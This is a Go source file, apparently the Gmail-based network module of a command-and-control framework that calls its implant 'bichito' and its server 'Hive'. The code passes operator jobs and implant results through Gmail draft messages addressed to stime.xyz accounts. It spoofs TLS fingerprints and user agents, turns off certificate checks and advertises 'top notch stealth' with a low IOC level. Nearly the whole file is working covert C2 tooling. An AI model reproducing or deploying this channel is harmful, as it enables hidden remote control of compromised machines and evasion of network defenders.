// +build gmailmimic
//// Listening Network Module for Redirectors ///////////////////////////////////////////////////////////
//
//   Network Method: Gmail APi is used. Draft mimic bichitos.
//
//   Warnings:       The top notch stealth                   
//                   
//   Fingenprint:    Selected Client TLS Fingerprint and user agent
//
//   IOC Level:      Low
//   
//
///////////////////////////////////////////////////////////////////////////////////////////////////////


package network

import (

    "encoding/json"
    "strings"
    "encoding/base64"
    "net/http"
    "net"
    "crypto/tls"
    "time"
    "os"
    "bytes"
    "golang.org/x/net/context"
    "golang.org/x/oauth2"
    "golang.org/x/oauth2/google"
    "google.golang.org/api/gmail/v1"
)

/*
JSON Structures for Compiling Redirectors Network Module parameters
Hive will have the same definitions in: ./src/hive/hiveImplants.go
*/
type Gmail struct {
    Name string   `json:"name"`    
    Creds string   `json:"creds"`
    Token string   `json:"token"`
}

type BiGmailMimic struct {
    UserAgent string `json:"useragent"`
    TlsFingenprint string `json:"tlsfingenprint"`
    Redirectors []string   `json:"redirectors"`
}

var (
    userAgent string
    tlsFingenprint string

)

type Job struct {
    Cid  string   `json:"cid"`              // The client CID triggered the job
    Jid  string   `json:"jid"`              // The Job Id (J-<ID>), useful to avoid replaying attacks
    Pid string   `json:"pid"`               // Parent Id, when the job came completed from a Implant, Pid is the Redirector where it cames from
    Chid string `json:"chid"`               // Implant Id
    Job string   `json:"job"`               // Job Name
    Time  string   `json:"time"`            // Time of creation
    Status  string   `json:"status"`        // Sent - Processing - Finished
    Result  string   `json:"result"`        // Job output data
    Parameters string   `json:"parameters"` // Parameters will be JSON serialized to provide flexibility
}

type BiAuth struct {
    Bid string   `json:"bid"`
    Token string  `json:"token"`  
}

/*
Description: GmailMimic,Prepare Redirector Slice
Flow:
A.JSON Decode redirector data, for gmail modules, connected app refresh token/creds are needed (redirectors are basically gmail accounts)
B.Loop over each redirector and craft a working gmail account to connect to
*/
func PrepareNetworkMocule(jsonstring string) []string{

    var coms *BiGmailMimic
    errD := json.Unmarshal([]byte(jsonstring),&coms)

    if errD != nil{
        //Debug:
        //fmt.Println("Parameters JSON Decoding error:"+errD.Error())
        os.Exit(1)
    }

    resD, err := base64.StdEncoding.DecodeString(coms.UserAgent)
    if err != nil {
        os.Exit(1)
    }

    userAgent = string(resD)
    tlsFingenprint = coms.TlsFingenprint
	return coms.Redirectors
}

/*
Description: GmailMimic, Retrieve Jobs from gmail draft mails that come from Hive
Flow:
A.Provided redirector (gmail creds) and auth JSON, retrieve BID
B.Retrieve gmail credentials from JSON, create a oauth google client and request access token
    B1.Use "Rebugo" new functions to set a TLS fingerprint to be used in both goole oauth and gmail client, also provide a target user agent
C.With the access token, list the draft and check if a mail draft thread exist with actual BID, if no create it
D.If a draft with BID subject exists, check if has redirector data "to:bichito@stime.xyz" and subject this BID
E.If exists, retireve body ,decode it and return (these are the jobs that come from hive to be processed)
*/
func RetrieveJobs(redirector string,authentication string) ([]byte,string){

    var result []byte

    //Get Bid
    var biauth *BiAuth
    //Decode auth bearer
    decoder := json.NewDecoder(bytes.NewBufferString(authentication))
    err := decoder.Decode(&biauth)

    if err != nil{
        return result,"Bichito Authentication Json Decoding Error"+err.Error()
    }

    bid := biauth.Bid

	

	//Decode Module Parameters, create listener socket
	var moduleParams *Gmail
	errDaws := json.Unmarshal([]byte(redirector),&moduleParams)
    if errDaws != nil {
        //ErrorLog
        return result,"Network(Listener JSON decoding error)"+errDaws.Error()
    }

    //Auth
    config, err := google.ConfigFromJSON([]byte(moduleParams.Creds), gmail.MailGoogleComScope)
    if err != nil {
        return result,"Unable to parse client secret file to config:" +err.Error()
    }
        
    tok := &oauth2.Token{}
    err = json.NewDecoder(strings.NewReader(moduleParams.Token)).Decode(tok)

    //Mimic https client with userAgent and TLS Fingenprint
    customTransport := &http.Transport{
        DialContext:(&net.Dialer{
        Timeout:   10 * time.Second,
        KeepAlive: 10 * time.Second,
        }).DialContext,


        //Skip TLS Verify since we are using self signed Certs
        TLSClientConfig:(&tls.Config{
            InsecureSkipVerify: true,
            TlsFingerprint: tlsFingenprint,
        }),

        TLSHandshakeTimeout:   20 * time.Second,   
        ExpectContinueTimeout: 10 * time.Second,
        ResponseHeaderTimeout: 10 * time.Second,        
    }

    c := config.CustomClient(customTransport, userAgent,context.Background(),tok)
       
    srv, err := gmail.NewCustom(c,userAgent)
    if err != nil {
        return result,"Unable to retrieve Gmail client:"+ err.Error()
    }


    //var messagesIds []string    
    user := "me"
    r, err := srv.Users.Drafts.List(user).Do()
    if err != nil {
        return result,"Draft List Getting Error: "+err.Error()
    }


    var existBid bool = false
    for _,l := range r.Drafts{
        r2, err2 := srv.Users.Messages.Get(user,l.Message.Id).Do()
            if err2 != nil {
                //Debug:
                //fmt.Println(l.Message.Id)
                existBid = true
                continue
                //return result,"Get target Id Message: " +err2.Error()
            }

        //Debug:
        //fmt.Println("Bid:"+r2.Payload.Headers[2].Value)
        //fmt.Println(r2.Payload.Headers[2].Value == bid)
        if (r2.Payload.Headers[2].Value == bid) {existBid = true}
        if (r2.Payload.Headers[1].Value == "bichito@stime.xyz") && (r2.Payload.Headers[2].Value == bid){

            rawDraftFormatted := r2.Payload.Body.Data
            rawDraftFormatted = strings.Replace(rawDraftFormatted,"_","/",-1)
            rawDraftFormatted = strings.Replace(rawDraftFormatted,"-","+",-1)

            //Get Body with Jobs JSON data and sent it to Hive Queue
            result, err = base64.StdEncoding.DecodeString(rawDraftFormatted)
            if err != nil {
                return result,err.Error()
            }
            //Debug:
            //fmt.Println("Bid:"+r2.Payload.Headers[2].Value+"TO:"+r2.Payload.Headers[1].Value+"Body:"+string(result))
            return result,"Success"
               
        }

    }

    //When Swapping to new SaaS, create the Gmai Draft
    if !existBid {
        ping := &Job{"","","",bid,"BiPing","","","",""}
    
        var jobsChecking = []*Job{ping}
        bufRC := new(bytes.Buffer)
        json.NewEncoder(bufRC).Encode(jobsChecking)
        resultRP := bufRC.String()

        err := Checking(redirector,authentication,bid,[]byte(resultRP))
        if err != ""{
            return result,err
        }
    }
    
    return result,"No redirector answer in respTime"
}

//Use Https to send a Job to the redirector
func SendJobs(redirector string,authentication string,encodedJob []byte) string{

    //Get Bid
    var biauth *BiAuth
    //Decode auth bearer
    decoder := json.NewDecoder(bytes.NewBufferString(authentication))
    err := decoder.Decode(&biauth)

    if err != nil{
        return "Bichito Authentication Json Decoding Error"+err.Error()
    }

    bid := biauth.Bid

	//Decode Module Parameters, create listener socket
	var moduleParams *Gmail
	errDaws := json.Unmarshal([]byte(redirector),&moduleParams)
    if errDaws != nil {
        //ErrorLog
        return "Network(Listener JSON decoding error)"+errDaws.Error()
    }

    //Auth
    config, err := google.ConfigFromJSON([]byte(moduleParams.Creds), gmail.MailGoogleComScope)
    if err != nil {
        return "Unable to parse client secret file to config:" +err.Error()
    }
        
    tok := &oauth2.Token{}
    err = json.NewDecoder(strings.NewReader(moduleParams.Token)).Decode(tok)


    //Mimic https client with userAgent and TLS Fingenprint
    customTransport := &http.Transport{
        DialContext:(&net.Dialer{
        Timeout:   10 * time.Second,
        KeepAlive: 10 * time.Second,
        }).DialContext,


        //Skip TLS Verify since we are using self signed Certs
        TLSClientConfig:(&tls.Config{
            InsecureSkipVerify: true,
            TlsFingerprint: tlsFingenprint,
        }),

        TLSHandshakeTimeout:   20 * time.Second,   
        ExpectContinueTimeout: 10 * time.Second,
        ResponseHeaderTimeout: 10 * time.Second,        
    }

    c := config.CustomClient(customTransport, userAgent,context.Background(),tok)
       
    srv, err := gmail.NewCustom(c,userAgent)
    if err != nil {
        return "Unable to retrieve Gmail client:"+ err.Error()
    }


    user := "me"
    r, err := srv.Users.Drafts.List(user).Do()
    if err != nil {
        return "Draft List Getting Error: "+err.Error()
    }


    for _,l := range r.Drafts{
        r2, err2 := srv.Users.Messages.Get(user,l.Message.Id).Do()
        if err2 != nil {
                continue
        }
        if (r2.Payload.Headers[2].Value == bid){
            rawDraft := "To: redirector@stime.xyz\r\nSubject:"+bid+"\r\n\r\n"+string(encodedJob)
            rawDraftFormatted := base64.StdEncoding.EncodeToString([]byte(rawDraft))
            rawDraftFormatted = strings.Replace(rawDraftFormatted,"+","-",-1)
            rawDraftFormatted = strings.Replace(rawDraftFormatted,"/","_",-1)
            rawDraftFormatted = strings.Replace(rawDraftFormatted,"=","",-1)
            message := &gmail.Message{Raw:rawDraftFormatted}
            draft := &gmail.Draft{Message:message}
       
            _, err = srv.Users.Drafts.Update(user,l.Id,draft).Do()
            if err != nil {
                //Debug:
                //fmt.Println(err.Error())
                return err.Error()
            }

            return "Success"
        }
    }

	return "No active Bid"
}


func Checking(redirector string,authentication string,bidP string,encodedJob []byte) string{

	//Decode Module Parameters, create listener socket
	var moduleParams *Gmail
	errDaws := json.Unmarshal([]byte(redirector),&moduleParams)
    if errDaws != nil {
        //ErrorLog
        return "Network(Listener JSON decoding error)"+errDaws.Error()
    }

    //Auth
    config, err := google.ConfigFromJSON([]byte(moduleParams.Creds), gmail.MailGoogleComScope)
    if err != nil {
        return "Unable to parse client secret file to config:" +err.Error()
    }
        
    tok := &oauth2.Token{}
    err = json.NewDecoder(strings.NewReader(moduleParams.Token)).Decode(tok)

    //Mimic https client with userAgent and TLS Fingenprint
    customTransport := &http.Transport{
        DialContext:(&net.Dialer{
        Timeout:   10 * time.Second,
        KeepAlive: 10 * time.Second,
        }).DialContext,


        //Skip TLS Verify since we are using self signed Certs
        TLSClientConfig:(&tls.Config{
            InsecureSkipVerify: true,
            TlsFingerprint: tlsFingenprint,
        }),

        TLSHandshakeTimeout:   20 * time.Second,   
        ExpectContinueTimeout: 10 * time.Second,
        ResponseHeaderTimeout: 10 * time.Second,        
    }

    c := config.CustomClient(customTransport, userAgent,context.Background(),tok)
       
    srv, err := gmail.NewCustom(c,userAgent)
    if err != nil {
        return "Unable to retrieve Gmail client:"+ err.Error()
    }

    //Debug:
    //fmt.Println("To Create Bichito:"+bidP)
    
    rawDraft := "To: redirector@stime.xyz\r\nSubject:"+bidP+"\r\n\r\n"+string(encodedJob)
    rawDraftFormatted := base64.StdEncoding.EncodeToString([]byte(rawDraft))
    rawDraftFormatted = strings.Replace(rawDraftFormatted,"+","-",-1)
    rawDraftFormatted = strings.Replace(rawDraftFormatted,"/","_",-1)
    rawDraftFormatted = strings.Replace(rawDraftFormatted,"=","",-1)
    message := &gmail.Message{Raw:rawDraftFormatted}
    user := "me"

    draft := &gmail.Draft{Message:message}
       
    _, err = srv.Users.Drafts.Create(user,draft).Do()
    if err != nil {
        return "Creating new Draft Error: "+err.Error()
    }


	return ""
}


